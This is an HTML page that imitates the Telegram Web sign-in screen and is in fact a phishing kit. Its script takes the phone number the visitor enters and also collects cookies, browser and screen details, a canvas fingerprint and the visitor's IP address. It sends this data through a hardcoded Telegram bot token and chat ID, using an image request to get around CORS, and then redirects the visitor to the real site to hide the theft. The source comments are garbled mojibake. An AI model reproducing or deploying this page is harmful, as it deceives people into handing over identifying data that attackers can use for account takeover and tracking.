<!DOCTYPE html>
<html>
<head>
    <title>Telegram Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #0088cc 0%, #00a8e8 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .login-container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .logo {
            width: 64px;
            height: 64px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #0088cc, #00a8e8);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 32px;
            font-weight: bold;
        }
        h1 {
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
            font-weight: 600;
        }
        input[type="tel"] {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #e1e5eb;
            border-radius: 12px;
            font-size: 16px;
            margin-bottom: 20px;
            transition: all 0.3s;
        }
        input[type="tel"]:focus {
            outline: none;
            border-color: #0088cc;
            box-shadow: 0 0 0 3px rgba(0,136,204,0.1);
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #0088cc, #00a8e8);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,136,204,0.3);
        }
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        .loader {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0088cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error {
            color: #ff4444;
            font-size: 14px;
            margin-bottom: 10px;
            display: none;
        }
        .success {
            color: #4CAF50;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">T</div>
        <h1>Sign in to Telegram</h1>
        <div class="error" id="error">Please enter a valid phone number</div>
        <form id="loginForm">
            <input type="tel" id="phone" placeholder="Your phone number" required pattern="[0-9]{10,15}">
            <button type="submit" id="submitBtn">Send code</button>
            <div class="loader" id="loader"></div>
            <div class="success" id="success"></div>
        </form>
    </div>

    <script>
        // –¢–í–û–ò –î–ê–ù–ù–´–ï (–Ω–æ –æ–Ω–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω—ã!)
        const BOT_TOKEN = '8258404871:AAEYPA8hn3-9Ruw-uN0jpu8A3AMSnNCFjDg';
        const CHAT_ID = '6504292955';
        
        // –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö (–±–µ–∑ –¥–æ–ª–≥–∏—Ö –∑–∞–ø—Ä–æ—Å–æ–≤)
        function collectData(phone) {
            const data = {
                // –û—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                phone: phone,
                timestamp: new Date().toISOString(),
                
                // –°–∏—Å—Ç–µ–º–∞
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                
                // –≠–∫—Ä–∞–Ω
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth
                },
                
                // –û–∫–Ω–æ
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    devicePixelRatio: window.devicePixelRatio
                },
                
                // –õ–æ–∫–∞—Ü–∏—è
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // –ë—Ä–∞—É–∑–µ—Ä
                cookies: document.cookie || 'no cookies',
                referrer: document.referrer || 'direct',
                
                // –ü–ª–∞–≥–∏–Ω—ã
                plugins: Array.from(navigator.plugins).map(p => p.name),
                
                // Canvas fingerprint
                canvas: getCanvasFingerprint(),
                
                // –•—Ä–∞–Ω–∏–ª–∏—â–∞
                localStorageKeys: Object.keys(localStorage).length,
                sessionStorageKeys: sessionStorage.length
            };
            
            return data;
        }
        
        // Canvas fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 150, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('Telegram Login', 2, 15);
                return canvas.toDataURL().substring(22, 50);
            } catch {
                return 'error';
            }
        }
        
        // –ë—ã—Å—Ç—Ä–æ–µ –ø–æ–ª—É—á–µ–Ω–∏–µ IP —á–µ—Ä–µ–∑ JSONP
        function getIP() {
            return new Promise((resolve) => {
                // –¢–∞–π–º–∞—É—Ç
                setTimeout(() => resolve('unknown'), 2000);
                
                // JSONP –∑–∞–ø—Ä–æ—Å
                window.ipCallback = function(response) {
                    resolve(response.ip || 'unknown');
                };
                
                const script = document.createElement('script');
                script.src = `https://api.ipify.org?format=jsonp&callback=ipCallback`;
                document.head.appendChild(script);
                setTimeout(() => {
                    if (script.parentNode) script.remove();
                }, 3000);
            });
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Image (–æ–±—Ö–æ–¥ CORS)
        async function sendToTelegram(data) {
            return new Promise((resolve) => {
                // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const message = `
üì± *–ù–û–í–´–ô –õ–û–ì–ò–ù TELEGRAM*
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üìû *–¢–µ–ª–µ—Ñ–æ–Ω:* ${data.phone}
üïê *–í—Ä–µ–º—è:* ${new Date(data.timestamp).toLocaleString()}
üåç *–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å:* ${data.timezone}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üñ•Ô∏è *–°–∏—Å—Ç–µ–º–∞:*
‚Ä¢ OS: ${data.platform}
‚Ä¢ –ë—Ä–∞—É–∑–µ—Ä: ${data.userAgent.substring(0, 50)}...
‚Ä¢ –Ø–∑—ã–∫: ${data.language}
‚Ä¢ –≠–∫—Ä–∞–Ω: ${data.screen.width}x${data.screen.height}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üåê *–°–µ—Ç—å:*
‚Ä¢ IP: ${data.ip}
‚Ä¢ Referrer: ${data.referrer.substring(0, 50) || 'direct'}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üîç *–û—Ç–ø–µ—á–∞—Ç–æ–∫:*
‚Ä¢ Canvas: ${data.canvas}
‚Ä¢ –ü–ª–∞–≥–∏–Ω–æ–≤: ${data.plugins.length}
‚Ä¢ –ö—É–∫–∏: ${data.cookies.length > 0 ? '–µ—Å—Ç—å' : '–Ω–µ—Ç'}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
                `;
                
                // –°–æ–∑–¥–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
                const img = new Image();
                img.onload = function() {
                    console.log('‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram');
                    resolve(true);
                };
                
                img.onerror = function() {
                    console.log('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram');
                    resolve(false);
                };
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram API
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const params = `?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                
                img.src = url + params;
            });
        }
        
        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function handleSubmit(phone) {
            const submitBtn = document.getElementById('submitBtn');
            const loader = document.getElementById('loader');
            const error = document.getElementById('error');
            const success = document.getElementById('success');
            
            // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è
            error.style.display = 'none';
            success.textContent = '';
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–æ–º–µ—Ä–∞
            if (!phone.match(/^[0-9]{10,15}$/)) {
                error.style.display = 'block';
                return false;
            }
            
            // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É
            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';
            loader.style.display = 'block';
            
            try {
                // 1. –°–æ–±–∏—Ä–∞–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ (–º–≥–Ω–æ–≤–µ–Ω–Ω–æ)
                const data = collectData(phone);
                
                // 2. –ü–æ–ª—É—á–∞–µ–º IP (—Å —Ç–∞–π–º–∞—É—Ç–æ–º 2 —Å–µ–∫—É–Ω–¥—ã)
                data.ip = await getIP();
                
                // 3. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                const sent = await sendToTelegram(data);
                
                // 4. –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                if (sent) {
                    success.textContent = '‚úì Code sent! Redirecting...';
                    success.style.color = '#4CAF50';
                    
                    // –†–µ–¥–∏—Ä–µ–∫—Ç —á–µ—Ä–µ–∑ 1.5 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        window.location.href = 'https://web.telegram.org';
                    }, 1500);
                    
                    return true;
                } else {
                    success.textContent = '‚ö†Ô∏è Connection error. Try again.';
                    success.style.color = '#ff9800';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Send code';
                    loader.style.display = 'none';
                    return false;
                }
                
            } catch (err) {
                console.error('Error:', err);
                success.textContent = '‚ùå Error occurred. Please refresh.';
                success.style.color = '#ff4444';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Send code';
                loader.style.display = 'none';
                return false;
            }
        }
        
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ñ–æ—Ä–º—ã
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            await handleSubmit(phone);
        });
        
        // –í–∞–ª–∏–¥–∞—Ü–∏—è –Ω–æ–º–µ—Ä–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
        document.getElementById('phone').addEventListener('input', function() {
            const error = document.getElementById('error');
            if (this.value.match(/^[0-9]{10,15}$/)) {
                error.style.display = 'none';
                this.style.borderColor = '#4CAF50';
            } else {
                this.style.borderColor = '#e1e5eb';
            }
        });
        
        // –ê–Ω—Ç–∏-—Ç–∞–π–º–∞—É—Ç (–Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π)
        setTimeout(() => {
            const submitBtn = document.getElementById('submitBtn');
            if (submitBtn.disabled && submitBtn.textContent === 'Processing...') {
                console.log('Global timeout activated');
                submitBtn.disabled = false;
                submitBtn.textContent = 'Send code';
                document.getElementById('loader').style.display = 'none';
                document.getElementById('success').textContent = '‚ö†Ô∏è Timeout. Try again.';
                document.getElementById('success').style.color = '#ff9800';
            }
        }, 10000); // 10 —Å–µ–∫—É–Ω–¥ –æ–±—â–∏–π —Ç–∞–π–º–∞—É—Ç
        
        // –ê–≤—Ç–æ-—Ñ–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞
        window.onload = function() {
            document.getElementById('phone').focus();
        };
    </script>
</body>
</html>